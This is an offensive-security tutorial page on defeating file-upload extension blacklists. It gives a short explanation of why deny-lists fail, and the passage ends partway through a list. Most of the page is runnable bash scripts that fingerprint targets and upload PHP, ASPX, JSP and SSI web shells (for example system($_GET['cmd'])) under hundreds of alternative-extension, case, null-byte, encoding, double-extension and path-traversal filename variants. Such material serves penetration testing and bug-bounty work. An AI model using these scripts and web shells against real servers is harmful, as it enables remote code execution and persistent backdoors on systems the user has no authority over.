---
title: Blacklist Filter Bypass
description: Blacklist Filter Bypass — Defeat Extension Blacklists in File Upload Validation
navigation:
  icon: i-lucide-filter-x
  title: Blacklist Filter Bypass
---

## Blacklist Filter Bypass

::note
**Blacklist filtering** (also called deny-list or negative-list filtering) is the approach of blocking specific known-dangerous file extensions while allowing everything else. This is fundamentally flawed because the attacker only needs to find **one extension the developer forgot to block** — while the developer must anticipate and block **every possible dangerous extension across all server configurations, operating systems, and runtime environments**. Blacklist bypasses are among the most common and successful file upload attack techniques in bug bounty because the number of executable extensions, encoding tricks, parser differentials, and server-specific behaviors is vast and constantly growing.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="Why Blacklists Fail"}
  **The fundamental asymmetry:**
  - Attacker needs to find **1 bypass** → wins
  - Developer must block **every possible variant** → impossible

  **Categories of blacklist failure:**

  1. **Incomplete extension coverage** — Missing `.phtml`, `.php5`, `.phar`, `.pgif`, `.shtml`
  2. **Case sensitivity mismatch** — Blocking `.php` but not `.PHP`, `.pHp`, `.Php`
  3. **Parser differential** — Validation sees `.jpg` but server executes `.php`
  4. **Encoding tricks** — URL encoding, double encoding, Unicode, null bytes
  5. **Trailing characters** — `.php.`, `.php `, `.php::$DATA` stripped by OS
  6. **Double extensions** — `.php.jpg` or `.jpg.php` processed differently
  7. **Configuration override** — `.htaccess`/`web.config` redefines handlers
  8. **New extensions added** — PHP 8 adds new handlers not in old blacklists
  9. **Server-specific behaviors** — IIS semicolons, Apache content negotiation
  10. **Content-Type confusion** — Application trusts Content-Type over extension
  :::

  :::accordion-item{icon="i-lucide-layers" label="Blacklist vs Whitelist Comparison"}
  | Aspect | Blacklist (Deny) | Whitelist (Allow) |
  | ------ | ---------------- | ----------------- |
  | **Approach** | Block known-bad | Allow known-good |
  | **Default stance** | Allow unless blocked | Deny unless allowed |
  | **Maintenance** | Must add new threats constantly | Rarely needs updates |
  | **Bypass difficulty** | Easy — find 1 missed extension | Hard — must match allowed types |
  | **False negatives** | Common — missed extensions | Rare |
  | **False positives** | Rare | Possible — legitimate types blocked |
  | **Security posture** | Weak | Strong |
  | **Industry recommendation** | Discouraged | Recommended by OWASP |
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Surface by Server Type"}
  | Server | Executable Extensions | Bypass Surface |
  | ------ | -------------------- | -------------- |
  | **Apache + mod_php** | `.php` `.phtml` `.php5` `.php7` `.php4` `.pht` `.phps` `.phar` `.pgif` `.inc` | 10+ extensions × 8 case variants each |
  | **Apache + CGI** | `.cgi` `.pl` `.py` `.rb` `.sh` `.bash` | Script handler extensions |
  | **Apache + SSI** | `.shtml` `.stm` `.shtm` | Server-Side Includes |
  | **Nginx + PHP-FPM** | `.php` + path_info tricks | Configuration-dependent |
  | **IIS + ASP.NET** | `.aspx` `.ashx` `.asmx` `.asp` `.asa` `.cer` `.cdx` `.cshtml` | 8+ extensions × case × ADS × semicolons |
  | **IIS + Classic ASP** | `.asp` `.asa` `.cer` `.cdx` | Legacy but still common |
  | **Tomcat** | `.jsp` `.jspx` `.jsw` `.jsv` `.jspf` | Java extensions |
  | **Node.js** | Configuration-dependent | Server-side template injection |
  | **ColdFusion** | `.cfm` `.cfml` `.cfc` | ColdFusion extensions |
  | **Configuration files** | `.htaccess` `.user.ini` `web.config` | Handler override |
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Impact"}
  | Impact | Description | Severity |
  | ------ | ----------- | -------- |
  | **Remote Code Execution** | Upload executable file → full server compromise | Critical |
  | **Webshell Deployment** | Persistent backdoor via forgotten extension | Critical |
  | **Configuration Override** | `.htaccess`/`web.config` changes server behavior | Critical |
  | **Stored XSS** | HTML/SVG upload via unblocked extension | High |
  | **Server-Side Template Injection** | Template file upload via unblocked extension | Critical |
  | **Information Disclosure** | Config file upload exposes paths/settings | Medium |
  :::
::

---

## Reconnaissance & Blacklist Fingerprinting

### Systematic Validation Detection

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Blacklist Identification"}
  ```bash
  #!/bin/bash
  # blacklist_fingerprint.sh — Identify blacklist coverage and gaps

  UPLOAD_URL="${1:?Usage: $0 <upload_url> [cookie] [field]}"
  COOKIE="${2:-session=TOKEN}"
  FIELD="${3:-file}"

  echo "═══════════════════════════════════════════════"
  echo " Blacklist Filter Fingerprinter"
  echo "═══════════════════════════════════════════════"
  echo "[*] Target: $UPLOAD_URL"
  echo ""

  SHELL_CONTENT='<?php echo "BLACKLIST_BYPASS_TEST"; ?>'
  echo "$SHELL_CONTENT" > /tmp/bl_test.txt

  upload_test() {
      local ext="$1"
      local ct="${2:-application/octet-stream}"
      local status
      status=$(curl -s -o /tmp/bl_resp_$$.txt -w "%{http_code}" \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/bl_test.txt;filename=test.${ext};type=${ct}" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      local resp_body
      resp_body=$(cat /tmp/bl_resp_$$.txt 2>/dev/null)
      local success="BLOCKED"

      if [ "$status" = "200" ] || [ "$status" = "201" ]; then
          if echo "$resp_body" | grep -qiE "success|upload|saved|created|url|path|file"; then
              success="ACCEPTED"
          elif ! echo "$resp_body" | grep -qiE "error|invalid|denied|blocked|forbidden|not allowed"; then
              success="MAYBE"
          fi
      fi

      echo "$ext|$success|$status"
  }

  echo "─── Phase 1: Confirm Blacklist Exists ───"
  for ext in php txt jpg png; do
      RESULT=$(upload_test "$ext")
      EXT=$(echo "$RESULT" | cut -d'|' -f1)
      STATUS=$(echo "$RESULT" | cut -d'|' -f2)
      CODE=$(echo "$RESULT" | cut -d'|' -f3)
      printf "  .%-10s → %-10s [%s]\n" "$EXT" "$STATUS" "$CODE"
  done

  echo ""
  # If both .php AND .txt are blocked → likely whitelist (not blacklist)
  # If .php blocked but .txt/.xyz accepted → blacklist confirmed
  RANDOM_EXT="xyztest$$"
  RAND_RESULT=$(upload_test "$RANDOM_EXT")
  RAND_STATUS=$(echo "$RAND_RESULT" | cut -d'|' -f2)

  if [ "$RAND_STATUS" = "ACCEPTED" ] || [ "$RAND_STATUS" = "MAYBE" ]; then
      echo "[+] BLACKLIST DETECTED — random extension .${RANDOM_EXT} accepted"
      echo "[*] Proceeding with blacklist bypass testing..."
  else
      echo "[!] WHITELIST LIKELY — random extension .${RANDOM_EXT} blocked"
      echo "[*] Blacklist bypass may not work, but testing anyway..."
  fi

  echo ""
  echo "─── Phase 2: PHP Extension Coverage ───"
  for ext in php phtml php5 php7 php4 php3 pht phps phar pgif phtm \
             inc module phpt php8 pHP Php PHP pHtMl PHTML PHp PhP \
             php. "php " php%20 php%00 php%0a \
             php.jpg jpg.php php.png php.txt \
             "php:::\$DATA" "php;.jpg"; do
      RESULT=$(upload_test "$ext")
      STATUS=$(echo "$RESULT" | cut -d'|' -f2)
      CODE=$(echo "$RESULT" | cut -d'|' -f3)
      [ "$STATUS" = "ACCEPTED" ] || [ "$STATUS" = "MAYBE" ] && \
          printf "  [+] .%-20s → %s [%s]\n" "$ext" "$STATUS" "$CODE"
  done

  echo ""
  echo "─── Phase 3: ASP/ASPX Extension Coverage ───"
  for ext in asp aspx ashx asmx asa cer cdx cshtml vbhtml config \
             ASP ASPX aSp AsPx Ashx \
             asp. aspx. "aspx " "aspx:::\$DATA" "aspx;.jpg"; do
      RESULT=$(upload_test "$ext")
      STATUS=$(echo "$RESULT" | cut -d'|' -f2)
      [ "$STATUS" = "ACCEPTED" ] || [ "$STATUS" = "MAYBE" ] && \
          printf "  [+] .%-20s → %s\n" "$ext" "$STATUS"
  done

  echo ""
  echo "─── Phase 4: JSP Extension Coverage ───"
  for ext in jsp jspx jsw jsv jspf JSP JsP Jsp \
             jsp. "jsp " "jsp;.jpg"; do
      RESULT=$(upload_test "$ext")
      STATUS=$(echo "$RESULT" | cut -d'|' -f2)
      [ "$STATUS" = "ACCEPTED" ] || [ "$STATUS" = "MAYBE" ] && \
          printf "  [+] .%-20s → %s\n" "$ext" "$STATUS"
  done

  echo ""
  echo "─── Phase 5: Configuration Files ───"
  for ext in htaccess htpasswd user.ini config \
             Htaccess HTACCESS HtAcCeSs \
             "user.ini" ".user.ini"; do
      RESULT=$(upload_test "$ext")
      STATUS=$(echo "$RESULT" | cut -d'|' -f2)
      [ "$STATUS" = "ACCEPTED" ] || [ "$STATUS" = "MAYBE" ] && \
          printf "  [+] .%-20s → %s\n" "$ext" "$STATUS"
  done

  echo ""
  echo "─── Phase 6: Other Server-Side Extensions ───"
  for ext in cfm cfml cfc pl cgi py rb sh bash \
             shtml stm shtm svg svgz xml xsl xslt \
             html htm xhtml hta mht mhtml; do
      RESULT=$(upload_test "$ext")
      STATUS=$(echo "$RESULT" | cut -d'|' -f2)
      [ "$STATUS" = "ACCEPTED" ] || [ "$STATUS" = "MAYBE" ] && \
          printf "  [+] .%-20s → %s\n" "$ext" "$STATUS"
  done

  rm -f /tmp/bl_test.txt /tmp/bl_resp_$$.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Error Message Analysis"}
  ```bash
  # ── Extract blacklist details from error messages ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo '<?php echo "test"; ?>' > /tmp/err_test.txt

  echo "═══ Error Message Analysis ═══"

  # Upload with blocked extension and capture full error
  for ext in php aspx jsp exe bat cmd; do
      RESP=$(curl -s -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/err_test.txt;filename=test.${ext}" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      echo ""
      echo "─── .${ext} error response ───"
      echo "$RESP" | python3 -m json.tool 2>/dev/null || echo "$RESP" | head -10

      # Extract useful patterns
      echo "$RESP" | grep -oiE "(allowed|blocked|forbidden|invalid|accepted|extensions?|types?|format)[^\"]*" | head -5
  done

  # Common error messages that reveal blacklist contents:
  # "File type not allowed. Blocked extensions: .php, .asp, .jsp"
  # "Invalid file extension"
  # "Allowed formats: jpg, png, gif, pdf"  ← This is actually a whitelist
  # "The file extension 'php' is not permitted"
  # "Extension blacklisted"
  # "Dangerous file type detected"

  rm -f /tmp/err_test.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-microscope" label="Server Technology Detection"}
  ```bash
  # ── Identify server stack to target the right extensions ──

  TARGET="https://target.com"

  echo "═══ Technology Stack Detection ═══"

  # HTTP headers
  curl -sI "$TARGET" | grep -iE "^server:|^x-powered-by:|^x-aspnet|^x-generator|^x-runtime"

  # Detailed fingerprint
  whatweb "$TARGET" -v 2>/dev/null | head -10

  # Error page fingerprinting
  curl -s "${TARGET}/nonexistent.php" | grep -ciE "apache|nginx|iis|php|asp\.net" | \
    xargs -I{} echo "PHP error pages found: {} matches"
  curl -s "${TARGET}/nonexistent.aspx" | grep -ciE "asp\.net|iis|microsoft|stack trace" | \
    xargs -I{} echo "ASP.NET error pages found: {} matches"
  curl -s "${TARGET}/nonexistent.jsp" | grep -ciE "tomcat|java|servlet|catalina" | \
    xargs -I{} echo "JSP error pages found: {} matches"

  # Test which handlers are active
  echo ""
  echo "─── Active Handler Detection ───"
  for ext in php aspx jsp asp cfm pl cgi shtml; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/nonexistent.${ext}" 2>/dev/null)
      case $STATUS in
          403) echo "  .${ext} → 403 (handler active, access denied)" ;;
          500) echo "  .${ext} → 500 (handler active, execution error)" ;;
          502|503) echo "  .${ext} → ${STATUS} (handler active, backend error)" ;;
          404) echo "  .${ext} → 404 (file not found, handler may be active)" ;;
          *) echo "  .${ext} → ${STATUS}" ;;
      esac
  done

  # PHP version detection (affects which extensions work)
  curl -sI "$TARGET" | grep -i "x-powered-by" | grep -oP "PHP/[\d.]+"
  curl -s "${TARGET}/phpinfo.php" 2>/dev/null | grep -oP "PHP Version [^<]+"

  # IIS detection
  curl -sI "$TARGET" | grep -i "microsoft-iis" && echo "[+] IIS detected — test .asp .aspx .ashx .cer .asa"

  # Apache detection
  curl -sI "$TARGET" | grep -i "apache" && echo "[+] Apache detected — test .phtml .php5 .pht .phar .htaccess"

  # Nginx detection
  curl -sI "$TARGET" | grep -i "nginx" && echo "[+] Nginx detected — test path_info, .user.ini"
  ```
  :::
::

---

## Bypass Technique Arsenal

### Category 1 — Alternative Executable Extensions

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="PHP Alternative Extensions"}
  ```bash
  # ═══════════════════════════════════════════════
  # PHP — Alternative extensions that execute as PHP
  # Blacklists typically block .php but forget these
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Create PHP shell
  SHELL='<?php echo "BLACKLIST_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/php_shell.txt

  # ── Tier 1: Commonly forgotten PHP extensions ──
  echo "─── Tier 1: Common alternatives ───"
  for ext in phtml php5 php7 pht phps phar; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/php_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # ── Tier 2: Rarely blocked PHP extensions ──
  echo "─── Tier 2: Rare alternatives ───"
  for ext in php4 php3 pgif phtm php8 pht phpt inc module; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/php_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # ── Tier 3: Case variations (covered in depth) ──
  echo "─── Tier 3: Case variations ───"
  for ext in PHP pHp Php PhP pHP PHp phP \
             PHTML pHtMl Phtml pHTML PHtml \
             PHP5 pHp5 Php5 PHP7 pHp7 \
             PHT pHt PhT PHAR pHaR \
             PHPS pHpS PhPs; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/php_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # ── Tier 4: Apache-specific handler extensions ──
  echo "─── Tier 4: Apache handler variants ───"
  # These work when Apache is configured with:
  # AddHandler application/x-httpd-php .php
  # (which matches sub-extensions too in some configs)
  for ext in php.bak php.old php.orig php.save php.swp \
             php.tmp php.dist php.sample php~ \
             php.1 php.2 php.xxx; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/php_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # ── All PHP extensions reference table ──
  # The complete list of extensions that MAY execute as PHP:
  # .php .phtml .php5 .php7 .php4 .php3 .php8
  # .pht .phps .phar .pgif .phtm .phpt
  # .inc .module
  # + all case permutations of each (8-32 per extension)
  # + trailing character variants (.php. .php%20 .php::$DATA)
  # + double extensions (.php.jpg .jpg.php)
  # + null byte variants (.php%00.jpg)
  # Total possible variants: 500+

  rm -f /tmp/php_shell.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="ASP / IIS Extensions"}
  ```bash
  # ═══════════════════════════════════════════════
  # ASP.NET / IIS — Alternative executable extensions
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # ASPX shell
  ASPX_SHELL='<%@ Page Language="C#" %><%Response.Write("BYPASS_" + System.Environment.MachineName);%>'
  echo "$ASPX_SHELL" > /tmp/aspx_shell.txt

  # Classic ASP shell
  ASP_SHELL='<%Response.Write("BYPASS_ASP")%>'
  echo "$ASP_SHELL" > /tmp/asp_shell.txt

  echo "─── ASP.NET Extensions ───"
  for ext in aspx ashx asmx ascx cshtml vbhtml svc; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/aspx_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── Classic ASP Extensions ───"
  for ext in asp asa cer cdx; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/asp_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── Case Variations ───"
  for ext in ASPX aSpX Aspx aSPX ASP aSp Asp ASHX aShX CER Cer; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/aspx_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── IIS-Specific Bypasses ───"
  for name in "shell.aspx." "shell.aspx%20" "shell.aspx:::\$DATA" \
              "shell.aspx;.jpg" "shell.aspx;.png" "shell.aspx;test" \
              "shell.asp." "shell.cer." "shell.cer;.jpg"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/aspx_shell.txt;filename=${name}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  rm -f /tmp/aspx_shell.txt /tmp/asp_shell.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="JSP / Java Extensions"}
  ```bash
  # ═══════════════════════════════════════════════
  # Java / Tomcat — Alternative executable extensions
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  JSP_SHELL='<%out.println("BYPASS_JSP_"+System.getProperty("os.name"));%>'
  echo "$JSP_SHELL" > /tmp/jsp_shell.txt

  echo "─── JSP Extensions ───"
  for ext in jsp jspx jsw jsv jspf; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── Case Variations ───"
  for ext in JSP JsP Jsp jSP JSPX JsPx jSpX; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── WAR Deployment ───"
  # If the app allows .war uploads, Tomcat auto-deploys them
  for ext in war WAR War wAr; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  rm -f /tmp/jsp_shell.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Other Server-Side Extensions"}
  ```bash
  # ═══════════════════════════════════════════════
  # Miscellaneous server-side executable extensions
  # Often completely missed by blacklists
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "─── ColdFusion ───"
  echo '<cfoutput>#Now()#</cfoutput>' > /tmp/cf_shell.txt
  for ext in cfm cfml cfc; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/cf_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── CGI / Script Extensions ───"
  echo '#!/usr/bin/env python3
  print("Content-Type: text/html\n\nBYPASS_CGI")' > /tmp/cgi_shell.txt
  for ext in cgi pl py rb sh bash; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/cgi_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── Server-Side Includes ───"
  echo '<!--#exec cmd="id"-->' > /tmp/ssi_shell.txt
  for ext in shtml stm shtm; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_shell.txt;filename=shell.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo "─── XSS / Client-Side ───"
  echo '<script>alert(document.domain)</script>' > /tmp/xss_shell.txt
  for ext in html htm xhtml svg svgz xml xsl mht mhtml hta; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/xss_shell.txt;filename=test.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED (XSS vector)"
  done

  echo "─── Configuration Override ───"
  echo '# test' > /tmp/config_test.txt
  for ext in htaccess htpasswd user.ini config; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/config_test.txt;filename=.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED (config override)"
  done

  echo "─── Template Engines ───"
  echo '{{7*7}}' > /tmp/tpl_test.txt
  for ext in tpl twig jinja2 j2 mustache hbs ejs pug jade; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/tpl_test.txt;filename=test.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED (template engine)"
  done

  rm -f /tmp/cf_shell.txt /tmp/cgi_shell.txt /tmp/ssi_shell.txt \
        /tmp/xss_shell.txt /tmp/config_test.txt /tmp/tpl_test.txt
  ```
  :::
::

### Category 2 — Double Extensions & Parser Tricks

::tabs
  :::tabs-item{icon="i-lucide-split" label="Double Extension Attacks"}
  ```bash
  # ═══════════════════════════════════════════════
  # Double extensions exploit how different components
  # determine which extension "counts"
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  SHELL='<?php system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/dbl_shell.txt

  echo "═══ Double Extension Bypass ═══"

  # ── Pattern 1: exec.safe (validation sees .safe, server may exec .exec) ──
  echo "─── exec.safe pattern ───"
  for combo in \
      "php.jpg" "php.jpeg" "php.png" "php.gif" "php.bmp" "php.ico" \
      "php.pdf" "php.txt" "php.doc" "php.xml" "php.html" "php.csv" \
      "phtml.jpg" "php5.jpg" "php7.jpg" "pht.jpg" "phar.jpg" \
      "asp.jpg" "aspx.jpg" "jsp.jpg" "cfm.jpg"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/dbl_shell.txt;filename=shell.${combo}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] shell.${combo} ACCEPTED"
  done

  # ── Pattern 2: safe.exec (validation sees .safe, rename/move makes .exec) ──
  echo "─── safe.exec pattern ───"
  for combo in \
      "jpg.php" "png.php" "gif.php" "txt.php" "pdf.php" \
      "jpg.phtml" "png.php5" "gif.pht" "txt.phar" \
      "jpg.asp" "png.aspx" "gif.jsp" "txt.cfm"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/dbl_shell.txt;filename=shell.${combo}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] shell.${combo} ACCEPTED"
  done

  # ── Pattern 3: Triple extensions ──
  echo "─── Triple extensions ───"
  for combo in \
      "php.jpg.php" "jpg.php.jpg" "php.png.php" \
      "txt.php.jpg" "jpg.txt.php" "php.txt.jpg" \
      "php.jpg.png" "png.jpg.php"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/dbl_shell.txt;filename=shell.${combo}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] shell.${combo} ACCEPTED"
  done

  # ── Pattern 4: Apache content negotiation ──
  # Apache MultiViews: shell.php.en → matches shell.php with language .en
  echo "─── Apache content negotiation ───"
  for combo in \
      "php.en" "php.fr" "php.de" "php.es" "php.it" \
      "php.en.jpg" "php.utf8" "php.html"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/dbl_shell.txt;filename=shell.${combo}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] shell.${combo} ACCEPTED"
  done

  rm -f /tmp/dbl_shell.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-split" label="Null Byte & Encoding Tricks"}
  ```bash
  # ═══════════════════════════════════════════════
  # Null byte, encoding, and special character tricks
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  SHELL='<?php system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/enc_shell.txt

  echo "═══ Encoding & Special Character Bypass ═══"

  # ── Null byte injection (legacy systems, PHP < 5.3.4) ──
  echo "─── Null byte variants ───"
  for name in \
      "shell.php%00.jpg" "shell.php%00.png" "shell.php%00.gif" \
      "shell.php%00.txt" "shell.php%00.pdf" \
      "shell.phtml%00.jpg" "shell.php5%00.jpg" \
      "shell.php%2500.jpg" "shell.php%c0%80.jpg" \
      "shell.php%e0%80%80.jpg" "shell.php%u0000.jpg"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/enc_shell.txt;filename=${name}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  # ── Trailing characters (OS strips these) ──
  echo "─── Trailing character variants ───"
  for name in \
      "shell.php." "shell.php.." "shell.php..." \
      "shell.php%20" "shell.php%09" "shell.php%0a" "shell.php%0d" \
      "shell.php " "shell.php  " \
      "shell.php:::\$DATA" "shell.php:::\$DATA......" \
      "shell.asp." "shell.aspx." "shell.aspx%20" \
      "shell.aspx:::\$DATA" "shell.jsp."; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/enc_shell.txt;filename=${name}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  # ── URL-encoded extension ──
  echo "─── URL-encoded extensions ───"
  for name in \
      "shell.%70%68%70" "shell.%70%68%70%35" \
      "shell.%2570%2568%2570" \
      "shell.p%68p" "shell.ph%70" "shell.%70hp" \
      "shell.%61%73%70%78" "shell.%6a%73%70"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/enc_shell.txt;filename=${name}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  # ── Unicode / UTF-8 tricks ──
  echo "─── Unicode variants ───"
  for name in \
      "shell.ph\u0070" "shell.\u0070hp" \
      "shell.p%c0%a8p" "shell.ph%c0%b0" \
      "shell.ⓟⓗⓟ" "shell.ｐｈｐ"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/enc_shell.txt;filename=${name}" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  # ── Backslash variants (Windows path separator) ──
  echo "─── Path separator variants ───"
  for name in \
      "shell.php/.jpg" "shell.php\\.jpg" \
      "shell.php%2f.jpg" "shell.php%5c.jpg" \
      "..\\shell.php" "../shell.php" \
      "uploads/../../shell.php"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/enc_shell.txt;filename=${name}" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  rm -f /tmp/enc_shell.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-split" label="Content-Type Mismatch"}
  ```bash
  # ═══════════════════════════════════════════════
  # Content-Type header manipulation
  # Some apps check Content-Type instead of/in addition to extension
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  SHELL='<?php system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/ct_shell.txt

  echo "═══ Content-Type Mismatch Bypass ═══"

  # ── PHP shell with various Content-Types ──
  for ct in \
      "image/jpeg" "image/png" "image/gif" "image/bmp" "image/webp" \
      "image/tiff" "image/svg+xml" "image/x-icon" \
      "application/octet-stream" "application/pdf" \
      "application/x-httpd-php" "application/x-php" \
      "text/plain" "text/html" "text/xml" "text/csv" \
      "application/json" "application/xml" \
      "application/zip" "application/gzip" \
      "multipart/form-data" "application/x-www-form-urlencoded" \
      "image/pjpeg" "image/x-png" \
